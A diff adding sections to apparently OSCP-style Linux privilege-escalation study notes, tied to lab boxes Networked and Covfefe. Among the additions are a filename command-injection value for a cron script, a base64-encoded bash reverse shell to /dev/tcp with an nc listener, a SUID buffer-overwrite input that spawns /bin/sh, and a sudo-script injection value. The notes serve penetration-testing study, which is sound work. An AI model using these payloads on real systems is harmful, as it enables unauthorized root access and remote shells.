@@ -166,6 +166,31 @@ su root2
 # password: w00t
 ```
 
+## User cron filename command injection
+
+Cron review must include user-specific crontabs and scripts that process web-writable directories. If a scheduled script inserts a filename into a shell command without quoting, the filename becomes the command-injection primitive.
+
+```bash
+crontab -l
+find /home -maxdepth 2 -type f \( -name 'crontab.*' -o -name '*cron*' \) -ls 2>/dev/null
+sed -n '1,240p' $CronScript
+```
+
+Use a harmless marker first and wait for one full interval:
+
+```text
+x;touch${IFS}cron_marker
+```
+
+Confirm the marker owner before encoding a callback command. Base64 keeps shell metacharacters and spaces out of the filename:
+
+```bash
+EncodedPayload=$(printf 'bash -i >& /dev/tcp/%s/%s 0>&1' "$LocalIP" "$Port" | base64 -w0)
+nc -lvnp $Port
+```
+
+The exact file-creation request depends on the upload or webshell path. Preserve the original script and remove only the controlled filename and marker afterward. See [[OSCP/BOXES/WRITE UPS/Linux/Networked|HTB Networked]].
+
 ---
 
 ## SUID Binary Exploitation (Module 18.4.1)
@@ -214,6 +239,26 @@ grep NOPASSWD /etc/sudoers   # should return nothing
 ```
 
 > `echo >` overwrites sudoers entirely; restore it from the original package or a verified backup. Source: Nukem (PG Practice), [[PrivEsc Linux - SUID]]
+
+### Custom SUID source review: adjacent string overwrite
+
+When a non-standard SUID helper has readable source, inspect the data flow before using a generic fuzzing workflow. Covfefe's helper uses `gets()` on a 20-byte buffer, checks a fixed five-byte prefix, and passes an adjacent `program` string to `execve()`.
+
+```bash
+SourceFile=/root/read_message.c
+SuidPath=/usr/local/bin/read_message
+sed -n '1,160p' $SourceFile
+checksec --file=$SuidPath
+readelf -h -l -s $SuidPath
+objdump -d -M intel $SuidPath
+# Five accepted bytes + fifteen padding bytes + a NUL-terminated replacement path
+(printf 'SimonAAAAAAAAAAAAAAA/bin/sh\0\n'; cat) | $SuidPath
+id
+```
+
+This is a local data overwrite, not a saved-return-address exploit. The existing SUID `execve()` call supplies the execution primitive, so no shellcode or ROP chain is needed. The NUL terminator keeps `/bin/sh` a valid C string, and an open stdin stream keeps the resulting shell interactive. Confirm `euid=0` rather than requiring the real UID to change.
+
+See [[OSCP/BOXES/WRITE UPS/Linux/Covfefe|Covfefe]] and [[COMMAND BREAKDOWNS/Privilege Escalation & Local Exploitation (Breakdowns)#Covfefe: custom SUID source review before blind fuzzing|Command Breakdowns]].
 
 ---
 
@@ -266,6 +311,29 @@ sudo man man    # then: !/bin/sh
 ```
 
 > Always look up the actual allowed binary on GTFOBins, not the module example. The VM may differ.
+
+## Sudo script that generates a privileged configuration
+
+When sudo allows a custom script, read the script instead of treating it like a normal binary escape. A script that accepts input, writes configuration assignments, and then invokes a privileged helper may be exploitable when the helper sources the generated file.
+
+```bash
+sudo -n -l
+sed -n '1,240p' $SudoScript
+grep -RniE 'source|\. |ifup|ifdown|systemctl|service|eval|exec|echo.*\$' $SudoScript /usr/local/sbin 2>/dev/null
+```
+
+Review the validation and quoting boundary. If spaces or shell separators survive into a file consumed by a root helper, use the documented input prompts with a controlled command-bearing value, verify `id`, and remove the generated configuration. See [[OSCP/BOXES/WRITE UPS/Linux/Networked|HTB Networked]].
+
+For the Networked-style `changename.sh` prompt sequence, source review showed that three ordinary values followed by a space-bearing `BOOTPROTO` value reached `ifup`:
+
+```text
+x
+x
+x
+dhcp /bin/bash
+```
+
+Do not apply this input to an unreviewed script. The exploitable condition is the combination of accepted spaces, unquoted assignment output, and a privileged helper that sources the result.
 
 ---
 
@@ -780,3 +848,5 @@ This page turns one repeatable part of an authorized assessment into a checklist
 ## Demonstrated in box write-ups
 
 - [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- demonstrates the workflow described here
+- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- user cron filename injection and sudo-generated configuration parsing
+- [[OSCP/BOXES/WRITE UPS/Linux/Covfefe|Covfefe]] -- custom SUID source review and adjacent-string privilege escalation
